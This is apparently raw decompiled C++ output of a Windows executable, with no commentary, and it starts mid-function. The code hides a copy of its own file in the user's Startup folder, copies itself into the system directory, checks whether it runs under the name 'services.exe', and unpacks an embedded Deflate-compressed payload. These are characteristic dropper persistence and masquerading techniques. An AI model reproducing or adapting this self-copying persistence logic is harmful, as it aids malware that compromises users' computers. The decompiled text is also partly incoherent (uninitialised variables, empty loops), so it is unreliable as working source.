    struct s13* eax11;
    int1_t less12;
    struct s5* v13;
    struct s5* ebp14;
    struct s5* v15;
    struct s5* edi16;
    struct s5* v17;
    struct s5* ecx18;
    struct s5* eax19;
    struct s5* edi20;
    struct s5* ebx21;
    struct s13* eax22;
    struct s5* ecx23;
    struct s5* v24;
    struct s5* eax25;
    struct s5* ecx26;
    struct s5* ebp27;
    signed char* eax28;

    esi6 = eax7;
    eax8 = esi6->fc;
    v9 = eax8;
    eax11 = fun_401a50(a2, a2, esi10);
    less12 = reinterpret_cast<int32_t>(eax11) < reinterpret_cast<int32_t>(0x100);
    if (eax11 != 0x100) {
        v13 = ebp14;
        v15 = edi16;
        do {
            if (!less12) {
                v17 = reinterpret_cast<struct s5*>(static_cast<uint32_t>(*reinterpret_cast<uint16_t*>(reinterpret_cast<uint32_t>(eax11) * 2 + 0x4031de)));
                ecx18 = reinterpret_cast<struct s5*>(static_cast<uint32_t>(*reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax11) - 0x101 + 0x403120)));
                eax19 = fun_4019d0(ecx18, v17, v15, v13);
                edi20 = eax19;
                eax22 = fun_401a50(ecx18, ebx21, v17);
                ecx23 = reinterpret_cast<struct s5*>(static_cast<uint32_t>(eax22->f403100));
                v24 = reinterpret_cast<struct s5*>(static_cast<uint32_t>(*reinterpret_cast<uint16_t*>(reinterpret_cast<uint32_t>(eax22) * 2 + 0x4033a0)));
                eax25 = fun_4019d0(ecx23, v24, ebx21, v17);
                ecx26 = reinterpret_cast<struct s5*>(0);
                ebp27 = eax25;
                if (!(reinterpret_cast<uint1_t>(reinterpret_cast<int32_t>(edi20) < reinterpret_cast<int32_t>(0)) | reinterpret_cast<uint1_t>(edi20 == 0))) {
                    do {
                        *reinterpret_cast<signed char*>(reinterpret_cast<uint32_t>(esi6->fc) + reinterpret_cast<uint32_t>(ecx26)) = *reinterpret_cast<signed char*>(reinterpret_cast<uint32_t>(esi6->fc) - reinterpret_cast<uint32_t>(ebp27) + reinterpret_cast<uint32_t>(ecx26));
                        ecx26 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(ecx26) + 1);
                    } while (reinterpret_cast<int32_t>(ecx26) < reinterpret_cast<int32_t>(edi20));
                }
                eax28 = reinterpret_cast<signed char*>(reinterpret_cast<uint32_t>(esi6->fc) + reinterpret_cast<uint32_t>(edi20));
            } else {
                *esi6->fc = *reinterpret_cast<signed char*>(&eax11);
                eax28 = esi6->fc + 1;
            }
            esi6->fc = eax28;
            eax11 = fun_401a50(a2, a2, v15);
            less12 = reinterpret_cast<int32_t>(eax11) < reinterpret_cast<int32_t>(0x100);
        } while (!reinterpret_cast<int1_t>(eax11 == 0x100));
    }
    *esi6->f10 = *esi6->f10 + (reinterpret_cast<uint32_t>(esi6->fc) - reinterpret_cast<uint32_t>(v9));
    return 0;
}

void fun_401dd0();

struct s0* fun_4014be(struct s0* ecx, struct s0* a2, void* a3, struct s0* a4, struct s0* a5, struct s0* a6) {
    void* eax7;
    void* ecx8;
    void* ecx9;
    void* ecx10;
    struct s0* ecx11;
    void* eax12;
    struct s0* eax13;
    void* ecx14;
    uint32_t eax15;
    struct s0* eax16;

    fun_401dd0();
    eax7 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(a2) + reinterpret_cast<int32_t>(a3));
    ecx8 = reinterpret_cast<void*>(static_cast<uint32_t>(*reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax7) - 1)));
    a4->f0 = ecx8;
    ecx9 = reinterpret_cast<void*>((reinterpret_cast<unsigned char>(ecx8) << 8) + *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax7) - 2));
    a4->f0 = ecx9;
    ecx10 = reinterpret_cast<void*>((reinterpret_cast<unsigned char>(ecx9) << 8) + *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax7) - 3));
    a4->f0 = ecx10;
    ecx11 = reinterpret_cast<struct s0*>(reinterpret_cast<unsigned char>(ecx10) << 8);
    eax12 = reinterpret_cast<void*>(*reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax7) - 4) + reinterpret_cast<uint32_t>(ecx11));
    a4->f0 = eax12;
    eax13 = fun_401560(ecx11);
    if (!eax13 || ((ecx14 = a4->f0, eax15 = fun_401710(eax13, reinterpret_cast<int32_t>(__zero_stack_offset()) - 4 - 4, a2, a3), !!eax15) || ecx14 != a4->f0)) {
        eax16 = reinterpret_cast<struct s0*>(0);
    } else {
        eax16 = eax13;
    }
    return eax16;
}

uint32_t fun_401573(signed char* a1, int32_t a2) {
    signed char* eax3;
    signed char* ecx4;
    int32_t eax5;
    uint32_t eax6;

    eax3 = a1;
    ecx4 = eax3;
    if (*eax3) {
        do {
            ++ecx4;
        } while (*ecx4);
        while (ecx4 != eax3 && static_cast<int32_t>(*ecx4) != a2) {
            --ecx4;
        }
    }
    eax5 = *ecx4 - a2;
    eax6 = reinterpret_cast<uint32_t>(-eax5);
    return ~(eax6 - (eax6 + reinterpret_cast<uint1_t>(eax6 < eax6 + reinterpret_cast<uint1_t>(!!eax5)))) & reinterpret_cast<uint32_t>(ecx4);
}

int32_t SetFileAttributesA = 0x2362;

int32_t GetModuleFileNameA = 0x234c;

int32_t CopyFileA = 0x2340;

int32_t fun_4012ed(struct s0* ecx, struct s0* a2) {
    void* ebp3;
    void* v4;
    int32_t eax5;
    int32_t v6;
    int32_t eax7;
    int32_t v8;
    int32_t esi9;
    int32_t v10;
    int32_t edi11;
    int32_t v12;
    int32_t v13;
    void* v14;
    signed char v15;
    void* v16;
    int32_t eax17;

    ebp3 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4);
    v4 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(ebp3) - 4);
    eax5 = reinterpret_cast<int32_t>(SHGetSpecialFolderLocation(0, 7, v4));
    if (eax5) {
        return 1;
    }
    eax7 = reinterpret_cast<int32_t>(SHGetPathFromIDListA(v6, reinterpret_cast<int32_t>(ebp3) - 0x108, 0, 7, v4));
    if (eax7) {
        v8 = esi9;
        v10 = edi11;
        v12 = v13;
        CoTaskMemFree(v12, v10);
        v14 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(ebp3) - 0x108);
        SetFileAttributesA(v14, 2, v12, v10);
        do {
        } while (v15);
        v16 = g4020f0;
        do {
        } while (*reinterpret_cast<signed char*>(&v16));
        eax17 = reinterpret_cast<int32_t>(GetModuleFileNameA());
        if (!eax17) 
            goto addr_401387_24;
    } else {
        v8 = 2;
        goto addr_401389_26;
    }
    CopyFileA(reinterpret_cast<int32_t>(ebp3) - 0x210, reinterpret_cast<int32_t>(ebp3) - 0x108, 0, 0x104, v14, 2, v12, v10);
    return 0;
    addr_401387_24:
    addr_401389_26:
    return v8;
}

void fun_4012a2(struct s0* ecx, struct s0* a2, struct s0* a3, struct s0* a4);

int32_t GetSystemDirectoryA = 0x2378;

int32_t fun_4013a6(struct s0* ecx) {
    void* ebp2;
    struct s0* esi3;
    struct s0* v4;
    struct s0* ecx5;
    int32_t eax6;
    signed char* eax7;
    void* edx8;
    signed char v9;
    int32_t eax10;
    signed char v11;
    void* v12;
    struct s0* v13;

    ebp2 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4);
    fun_4012a2(ecx, 21, esi3, v4);
    fun_4012a2(ecx, 43, 21, esi3);
    ecx5 = reinterpret_cast<struct s0*>(21);
    fun_4012ed(21, esi3);
    eax6 = reinterpret_cast<int32_t>(GetSystemDirectoryA(21));
    if (eax6) {
        eax7 = reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(ebp2) - 0x108);
        edx8 = reinterpret_cast<void*>(eax7 + 1);
        do {
            *reinterpret_cast<signed char*>(&ecx5) = v9;
            ++eax7;
        } while (*reinterpret_cast<signed char*>(&ecx5));
        if (reinterpret_cast<uint32_t>(reinterpret_cast<int32_t>(eax7) - reinterpret_cast<int32_t>(edx8) + 13) > 0x104) 
            goto addr_4013f8_5;
    } else {
        eax10 = eax6 + 1;
        goto addr_401441_7;
    }
    do {
    } while (v11);
    v12 = g4020f0;
    do {
    } while (*reinterpret_cast<signed char*>(&v12));
    v13 = reinterpret_cast<struct s0*>(reinterpret_cast<int32_t>(ebp2) - 0x108);
    fun_401048(ecx5, v13);
    fun_401172(v13);
    eax10 = 0;
    addr_401441_7:
    return eax10;
    addr_4013f8_5:
    eax10 = 2;
    goto addr_401441_7;
}

uint32_t fun_401444() {
    uint32_t eax1;
    unsigned char* esi2;
    int32_t ecx3;
    unsigned char* edi4;
    uint32_t eax5;
    uint1_t cf6;
    int1_t zf7;
    uint1_t cf8;
    uint32_t eax9;

    GetModuleFileNameA();
    eax1 = fun_401573(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4 - 0x108, 92);
    esi2 = reinterpret_cast<unsigned char*>(eax1 + 1);
    ecx3 = 13;
    edi4 = reinterpret_cast<unsigned char*>("services.exe");
    eax5 = 0;
    cf6 = 0;
    zf7 = 1;
    do {
        if (!ecx3) 
            break;
        --ecx3;
        cf6 = reinterpret_cast<uint1_t>(*esi2 < *edi4);
        zf7 = *esi2 == *edi4;
        ++edi4;
        ++esi2;
    } while (zf7);
    if (!zf7) {
        cf8 = reinterpret_cast<uint1_t>(0 < static_cast<uint32_t>(cf6));
        eax9 = -static_cast<uint32_t>(cf8);
        eax5 = eax9 - (1 - reinterpret_cast<uint1_t>(eax9 < 1 - cf8));
    }
    return eax5;
}

int32_t* fun_40148d(struct s0* ecx, int32_t a2, int32_t a3, int32_t a4, unsigned char* a5) {
    uint32_t eax6;

    fun_4013a6(ecx);
    eax6 = fun_401444();
    if (eax6) {
        fun_4014a6();
    }
    return 1;
}

int32_t fun_4016c5(int32_t* a1, int32_t* a2, uint32_t a3, int32_t* a4, int32_t* a5, uint32_t a6) {
    int32_t* esi7;
    int32_t eax8;
    int32_t eax9;

    esi7 = a1;
    while (reinterpret_cast<uint32_t>(esi7) < reinterpret_cast<uint32_t>(a2)) {
        eax8 = *esi7;
        if (!eax8) 
            goto addr_4016df_4;
        eax9 = reinterpret_cast<int32_t>(eax8());
        if (!a3) 
            goto addr_4016df_4;
        if (eax9) 
            goto addr_4016ea_7;
        addr_4016df_4:
        ++esi7;
    }
    eax9 = 0;
    addr_4016ea_7:
    return eax9;
}

void fun_4016ec();

int32_t ExitProcess = 0x23d8;

int32_t fun_401690(int32_t* a1, uint32_t a2, void* a3, int32_t* a4) {
    int32_t* esi5;
    int32_t eax6;
    int32_t eax7;

    fun_4016ec();
    fun_4016c5(0x403014, 0x403018, 0, __return_address(), a1, a2);
    fun_4016c5(0x40301c, 0x403020, 0, 0x403014, 0x403018, 0);
    ExitProcess();
    esi5 = reinterpret_cast<int32_t*>(__return_address());
    while (reinterpret_cast<uint32_t>(esi5) < reinterpret_cast<uint32_t>(a1)) {
        eax6 = *esi5;
        if (!eax6) 
            goto addr_4016df_5;
        eax7 = reinterpret_cast<int32_t>(eax6());
        if (!a2) 
            goto addr_4016df_5;
        if (eax7) 
            goto addr_4016ea_8;
        addr_4016df_5:
        ++esi5;
    }
    eax7 = 0;
    addr_4016ea_8:
    return eax7;
}

int32_t g403040 = 0;

void fun_4016ec() {
    int1_t zf1;
    int32_t eax2;

    while (zf1 = g403040 == 0, !zf1) {
        --g403040;
        eax2 = g403040;
        *reinterpret_cast<int32_t*>(eax2 * 4 + 0x403060)();
    }
    return;
}

struct s15 {
    signed char[8] pad8;
    int32_t f8;
};

struct s16 {
    signed char[8] pad8;
    int32_t f8;
};

struct s17 {
    signed char[4] pad4;
    uint32_t f4;
};

struct s18 {
    signed char[8] pad8;
    int32_t f8;
};

struct s19 {
    signed char[4] pad4;
    uint32_t f4;
};

struct s20 {
    signed char[4] pad4;
    uint32_t f4;
};

struct s13* fun_401a50(struct s5* ecx, struct s5* a2, struct s5* a3) {
    struct s5* ebp4;
    uint32_t ebx5;
    uint32_t esi6;
    struct s5* edi7;
    int1_t zf8;
    struct s15* edx9;
    struct s16* edx10;
    int32_t eax11;
    unsigned char** edx12;
    struct s17* edx13;
    int32_t* edx14;
    struct s18* edx15;
    uint32_t ecx16;
    struct s19* edx17;
    struct s20* edx18;
    uint32_t eax19;

    ebp4 = a2;
    ebx5 = 0;
    esi6 = 0;
    edi7 = ebp4;
    do {
        zf8 = edx9->f8 == 0;
        edx10->f8 = edx9->f8 - 1;
        if (zf8) {
            eax11 = reinterpret_cast<int32_t>(*edx12 + 1);
            edx13->f4 = **edx12;
            *edx14 = eax11;
            edx15->f8 = 7;
        }
        ecx16 = edx17->f4;
        edi7 = reinterpret_cast<struct s5*>(&edi7->pad4202776);
        edx18->f4 = edx17->f4 >> 1;
        eax19 = edi7->f0;
        ebx5 = ebx5 + eax19;
        esi6 = esi6 + esi6 - eax19 + (ecx16 & 1);
    } while (reinterpret_cast<int32_t>(esi6) >= reinterpret_cast<int32_t>(0));
    return static_cast<uint32_t>(*reinterpret_cast<uint16_t*>(reinterpret_cast<uint32_t>(ebp4) + (esi6 + ebx5) * 2 + 32));
}

struct s21 {
    int32_t f0;
    int32_t f4;
    int32_t f8;
    int16_t fc;
};

struct s22 {
    signed char[14] pad14;
    int16_t fe;
};

struct s23 {
    signed char[16] pad16;
    int16_t f10;
};

struct s24 {
    signed char[18] pad18;
    int16_t f12;
};

struct s25 {
    signed char[32] pad32;
    int16_t f20;
};

struct s26 {
    signed char[80] pad80;
    int16_t f50;
};

struct s27 {
    signed char[368] pad368;
    int16_t f170;
};

struct s28 {
    signed char[370] pad370;
    int16_t f172;
};

struct s29 {
    signed char[372] pad372;
    int16_t f174;
};

struct s30 {
    signed char[374] pad374;
    int16_t f176;
};

struct s31 {
    signed char[376] pad376;
    int16_t f178;
};

struct s32 {
    signed char[378] pad378;
    int16_t f17a;
};

struct s33 {
    signed char[380] pad380;
    int16_t f17c;
};

struct s34 {
    signed char[382] pad382;
    int16_t f17e;
};

struct s35 {
    signed char[384] pad384;
    int16_t f180;
};

struct s36 {
    int32_t f0;
    int32_t f4;
    int16_t f8;
};

struct s37 {
    signed char[10] pad10;
    int16_t fa;
};

struct s38 {
    signed char[32] pad32;
    int16_t f20;
};

void fun_401850() {
    int32_t ecx1;
    struct s21* eax2;
    struct s22* eax3;
    struct s23* eax4;
    struct s24* eax5;
    int16_t* edx6;
    struct s25* eax7;
    int32_t edi8;
    int32_t ecx9;
    int16_t* edx10;
    struct s26* eax11;
    struct s27* eax12;
    struct s28* eax13;
    struct s29* eax14;
    struct s30* eax15;
    struct s31* eax16;
    struct s32* eax17;
    struct s33* eax18;
    struct s34* eax19;
    int32_t ecx20;
    int16_t* eax21;
    struct s35* eax22;
    int32_t edx23;
    int32_t eax24;
    struct s36* esi25;
    struct s37* esi26;
    int16_t* ecx27;
    struct s38* esi28;

    ecx1 = 0;
    eax2->f0 = 0;
    eax2->f4 = 0;
    eax2->f8 = 0;
    eax2->fc = 0;
    eax3->fe = 24;
    eax4->f10 = 0x98;
    eax5->f12 = 0x70;
    edx6 = &eax7->f20;
    do {
        edi8 = ecx1 + 0x100;
        *edx6 = *reinterpret_cast<int16_t*>(&edi8);
        ++ecx1;
        ++edx6;
    } while (ecx1 < 24);
    ecx9 = 0;
    edx10 = &eax11->f50;
    do {
        *edx10 = *reinterpret_cast<int16_t*>(&ecx9);
        ++ecx9;
        ++edx10;
    } while (ecx9 < 0x90);
    eax12->f170 = 0x118;
    eax13->f172 = 0x119;
    eax14->f174 = 0x11a;
    eax15->f176 = 0x11b;
    eax16->f178 = 0x11c;
    eax17->f17a = 0x11d;
    eax18->f17c = 0x11e;
    eax19->f17e = 0x11f;
    ecx20 = 0;
    eax21 = &eax22->f180;
    do {
        edx23 = ecx20 + 0x90;
        *eax21 = *reinterpret_cast<int16_t*>(&edx23);
        ++ecx20;
        ++eax21;
    } while (ecx20 < 0x70);
    eax24 = 0;
    esi25->f0 = 0;
    esi25->f4 = 0;
    esi25->f8 = 0;
    esi26->fa = 32;
    ecx27 = &esi28->f20;
    do {
        *ecx27 = *reinterpret_cast<int16_t*>(&eax24);
        ++eax24;
        ++ecx27;
    } while (eax24 < 32);
    return;
}

int32_t g403120 = 0;

int16_t g403100 = 0;

signed char g40313c = 0;

int16_t g403418;

void fun_401dd0() {
    uint32_t eax1;
    uint32_t ecx2;
    int32_t edx3;
    int32_t eax4;
    int32_t esi5;
    uint32_t eax6;
    uint32_t edx7;
    int32_t edx8;
    int32_t eax9;
    int32_t esi10;

    fun_401850();
    g403120 = 0;
    eax1 = 0;
    do {
        ecx2 = eax1 >> 2;
        *reinterpret_cast<signed char*>(eax1 + 0x403124) = *reinterpret_cast<signed char*>(&ecx2);
        ++eax1;
    } while (reinterpret_cast<int32_t>(eax1) < reinterpret_cast<int32_t>(26));
    edx3 = 3;
    eax4 = 0;
    do {
        esi5 = 1 << *reinterpret_cast<unsigned char*>(eax4 + 0x403120);
        *reinterpret_cast<int16_t*>(eax4 * 2 + 0x4033e0) = *reinterpret_cast<int16_t*>(&edx3);
        edx3 = edx3 + esi5;
        ++eax4;
    } while (eax4 < 30);
    g403100 = 0;
    eax6 = 0;
    do {
        edx7 = eax6 >> 1;
        *reinterpret_cast<signed char*>(eax6 + 0x403102) = *reinterpret_cast<signed char*>(&edx7);
        ++eax6;
    } while (reinterpret_cast<int32_t>(eax6) < reinterpret_cast<int32_t>(28));
    edx8 = 1;
    eax9 = 0;
    do {
        esi10 = 1 << *reinterpret_cast<unsigned char*>(eax9 + 0x403100);
        *reinterpret_cast<int16_t*>(eax9 * 2 + 0x4033a0) = *reinterpret_cast<int16_t*>(&edx8);
        edx8 = edx8 + esi10;
        ++eax9;
    } while (eax9 < 30);
    g40313c = 0;
    g403418 = 0x102;
    return;
}

void fun_4012a2(struct s0* ecx, struct s0* a2, struct s0* a3, struct s0* a4) {
    void* ebp5;
    struct s0* esi6;
    struct s0* v7;
    struct s0* v8;
    struct s0* v9;
    struct s0* eax10;
    struct s0* v11;
    int32_t eax12;
    struct s0* v13;
    struct s0* v14;
    struct s0* v15;
    struct s0* v16;
    struct s0* v17;
    struct s0* v18;
    struct s0* v19;
    struct s0* v20;
    struct s0* v21;
    struct s0* v22;
    struct s0* v23;

    ebp5 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4);
    eax10 = fun_401197(ecx, a2, esi6, v7, v8, v9);
    if (eax10) {
        v11 = reinterpret_cast<struct s0*>(reinterpret_cast<int32_t>(ebp5) - 0x108);
        eax12 = reinterpret_cast<int32_t>(GetModuleFileNameA(a2, 0, v11, 0x104));
        if (eax12) {
            CopyFileA(a2, reinterpret_cast<int32_t>(ebp5) - 0x108, eax10, 0, 0, v11, 0x104);
        }
        fun_401536(a2, eax10, 0, v11, 0x104, esi6, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22, v23);
    }
    return;
}

int32_t fun_401d60(struct s5* ecx);

int32_t fun_401e90(struct s0* a1, void** a2, struct s4* a3, uint32_t a4) {
    struct s4* v5;
    void* ecx6;
    struct s5* v7;
    struct s5* ebx8;
    struct s5* v9;
    struct s5* esi10;
    struct s5** esp11;
    void* v12;
    uint32_t eax13;
    uint32_t v14;
    struct s5* eax15;
    struct s5* eax16;
    int32_t eax17;
    uint32_t eax18;
    struct s4** esp19;
    struct s4* v20;
    struct s5** esp21;
    struct s5* v22;
    struct s5* v23;
    void* esp24;
    struct s5* ecx25;

    v5 = a3;
    ecx6 = reinterpret_cast<void*>(0);
    v7 = ebx8;
    *a2 = reinterpret_cast<void*>(0);
    v9 = esi10;
    esp11 = reinterpret_cast<struct s5**>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 0x4d4 - 4 - 4);
    while (1) {
        v12 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(ecx6) - 1);
        if (ecx6) {
            eax13 = v14;
        } else {
            eax13 = v5->f0;
            v5 = reinterpret_cast<struct s4*>(&v5->f1);
            v12 = reinterpret_cast<void*>(7);
        }
        v14 = eax13 >> 1;
        eax15 = fun_4019d0(2, 0, v9, v7);
        esp11 = esp11 - 1 - 1 + 1 + 1;
        eax16 = eax15;
        if (!eax16) {
            eax17 = fun_401d60(2);
            esp11 = esp11 - 1 + 1;
        } else {
            eax18 = reinterpret_cast<uint32_t>(eax16) - 1;
            if (!eax18) {
                eax17 = fun_401c90(2, 0x403420, v9, v7, v5);
                esp11 = esp11 - 1 - 1 + 1 + 1;
            } else {
                if (eax18 - 1) 
                    break;
                esp19 = reinterpret_cast<struct s4**>(esp11 - 1);
                v20 = reinterpret_cast<struct s4*>(esp11 + 0x9f);
                esp21 = reinterpret_cast<struct s5**>(esp19 - 1);
                v22 = reinterpret_cast<struct s5*>(esp19 + 8);
                v23 = reinterpret_cast<struct s5*>(esp21 + 4);
                fun_401ab0(v23, v22, v20);
                esp24 = reinterpret_cast<void*>(esp21 - 1 - 1 + 1);
                ecx25 = reinterpret_cast<struct s5*>(reinterpret_cast<int32_t>(esp24) + 40);
                eax17 = fun_401c90(ecx25, ecx25, v23, v22, v20);
                esp11 = reinterpret_cast<struct s5**>(reinterpret_cast<int32_t>(esp24) - 4 - 4 + 4 + 16);
            }
        }
        if (eax17) 
            break;
        if (eax13 & 1) 
            goto addr_401f7f_13;
        ecx6 = v12;
    }
    return -3;
    addr_401f7f_13:
    return 0;
}

struct s39 {
    unsigned char f0;
    unsigned char f1;
    unsigned char f2;
    unsigned char f3;
};

struct s40 {
    signed char[12] pad12;
    signed char* fc;
};

struct s41 {
    signed char[12] pad12;
    int32_t fc;
};

struct s42 {
    signed char[12] pad12;
    int32_t fc;
};

struct s43 {
    signed char[8] pad8;
    int32_t f8;
};

struct s44 {
    signed char[16] pad16;
    uint32_t* f10;
};

int32_t fun_401d60(struct s5* ecx) {
    struct s39* edx2;
    struct s39** eax3;
    uint32_t ecx4;
    uint32_t ecx5;
    uint32_t esi6;
    int32_t* eax7;
    uint32_t esi8;
    struct s40* eax9;
    signed char** eax10;
    int32_t edi11;
    int32_t* eax12;
    struct s41* eax13;
    struct s42* eax14;
    int32_t* eax15;
    struct s43* eax16;
    struct s44* eax17;

    edx2 = *eax3;
    ecx4 = edx2->f1;
    ecx5 = (ecx4 << 8) + edx2->f0;
    esi6 = edx2->f3;
    if (ecx5 == (~((esi6 << 8) + edx2->f2) & 0xffff)) {
        *eax7 = reinterpret_cast<int32_t>(edx2 + 1);
        if (ecx5) {
            esi8 = ecx5;
            do {
                *eax9->fc = **eax10;
                edi11 = *eax12 + 1;
                --esi8;
                eax13->fc = eax14->fc + 1;
                *eax15 = edi11;
            } while (esi8);
        }
        eax16->f8 = 0;
        *eax17->f10 = *eax17->f10 + ecx5;
        return 0;
    } else {
        return -3;
    }
}

int32_t g4030e4 = 0;

int32_t GetCommandLineA = 0x23c6;

int32_t GetStartupInfoA = 0x23b4;

int32_t fun_4015a4() {
    void* ebp1;
    int32_t eax2;
    int32_t eax3;
    int32_t* v4;
    int32_t* v5;
    uint32_t v6;
    int32_t eax7;
    int32_t* v8;
    int32_t* esi9;
    int32_t* v10;
    uint32_t v11;
    unsigned char* eax12;
    unsigned char* esi13;
    int32_t v14;
    struct s0* ecx15;
    unsigned char al16;
    void* v17;
    uint32_t eax18;
    uint16_t v19;
    int32_t eax20;
    int32_t* eax21;
    int32_t eax22;

    ebp1 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4);
    eax2 = g4030e4;
    if (!eax2 || (eax3 = reinterpret_cast<int32_t>(eax2()), !!eax3)) {
        eax7 = fun_4016c5(0x403008, 0x403010, 1, v4, v5, v6);
        if (!eax7) {
            addr_4015dd_3:
            v8 = esi9;
            fun_4016c5(0x403000, 0x403004, 0, v8, v10, v11);
            eax12 = reinterpret_cast<unsigned char*>(GetCommandLineA(v8));
            esi13 = eax12;
            if (!esi13) {
                esi13 = reinterpret_cast<unsigned char*>(0x402114);
            }
        } else {
            v14 = 0xfd;
            goto addr_4015d7_6;
        }
    } else {
        v14 = 0xfe;
        goto addr_4015d7_6;
    }
    *reinterpret_cast<unsigned char*>(&ecx15) = 32;
    while (*esi13) {
        if (*esi13 > 32) 
            goto addr_401616_11;
        ++esi13;
    }
    if (*esi13 <= 32) {
        addr_40162d_14:
        while (*esi13 && *esi13 <= *reinterpret_cast<unsigned char*>(&ecx15)) {
            ++esi13;
        }
    } else {
        addr_401616_11:
        al16 = *esi13;
        goto addr_401618_16;
    }
    v17 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(ebp1) - 68);
    GetStartupInfoA(v17, v8);
    if (1) {
        eax18 = 10;
    } else {
        eax18 = v19;
    }
    eax20 = reinterpret_cast<int32_t>(GetModuleHandleA(0, 0, esi13));
    eax21 = fun_40148d(ecx15, eax20, 0, 0, esi13);
    eax22 = fun_401690(eax21, eax18, v17, v8);
    return eax22;
    do {
        addr_401618_16:
        if (al16 == 34) {
            *reinterpret_cast<unsigned char*>(&ecx15) = reinterpret_cast<unsigned char>(*reinterpret_cast<unsigned char*>(&ecx15) ^ 32);
        }
        ++esi13;
        al16 = *esi13;
    } while (al16 > *reinterpret_cast<unsigned char*>(&ecx15));
    goto addr_40162d_14;
    addr_4015d7_6:
    ExitProcess(v14);
    goto addr_4015dd_3;
}

void fun_401959() {
}

void fun_401b6d(int32_t ecx) {
}

void fun_401e0a() {
}

void fun_401e3a() {
}

void fun_401e59() {
}

void fun_401fad(int32_t ecx) {
}

void fun_401fe3() {
    signed char* eax1;
    signed char* eax2;
    signed char al3;
    signed char* eax4;
    signed char* eax5;
    signed char al6;
    signed char* eax7;
    signed char* eax8;
    signed char al9;
    signed char* eax10;
    signed char* eax11;
    signed char al12;
    signed char* eax13;
    signed char* eax14;
    signed char al15;
    signed char* eax16;
    signed char* eax17;
    signed char al18;
    signed char* eax19;
    signed char* eax20;
    signed char al21;
    signed char* eax22;
    signed char* eax23;
    signed char al24;
    signed char* eax25;
    signed char* eax26;
    signed char al27;
    signed char* eax28;
    signed char* eax29;
    signed char al30;
    signed char* eax31;
    signed char* eax32;
    signed char al33;
    signed char* eax34;
    signed char* eax35;
    signed char al36;
    signed char* eax37;
    signed char* eax38;
    signed char al39;
    signed char* eax40;
    signed char* eax41;
    signed char al42;

    *eax1 = reinterpret_cast<signed char>(*eax2 + al3);
    *eax4 = reinterpret_cast<signed char>(*eax5 + al6);
    *eax7 = reinterpret_cast<signed char>(*eax8 + al9);
    *eax10 = reinterpret_cast<signed char>(*eax11 + al12);
    *eax13 = reinterpret_cast<signed char>(*eax14 + al15);
    *eax16 = reinterpret_cast<signed char>(*eax17 + al18);
    *eax19 = reinterpret_cast<signed char>(*eax20 + al21);
    *eax22 = reinterpret_cast<signed char>(*eax23 + al24);
    *eax25 = reinterpret_cast<signed char>(*eax26 + al27);
    *eax28 = reinterpret_cast<signed char>(*eax29 + al30);
    *eax31 = reinterpret_cast<signed char>(*eax32 + al33);
    *eax34 = reinterpret_cast<signed char>(*eax35 + al36);
    *eax37 = reinterpret_cast<signed char>(*eax38 + al39);
    *eax40 = reinterpret_cast<signed char>(*eax41 + al42);
}

int32_t GetProcessHeap = 0x23e6;

int32_t fun_40167b() {
    int32_t eax1;
    int32_t ecx2;

    eax1 = reinterpret_cast<int32_t>(GetProcessHeap());
    ecx2 = 0;
    *reinterpret_cast<unsigned char*>(&ecx2) = reinterpret_cast<uint1_t>(eax1 == 0);
    g4030e0 = eax1;
    return ecx2;
}
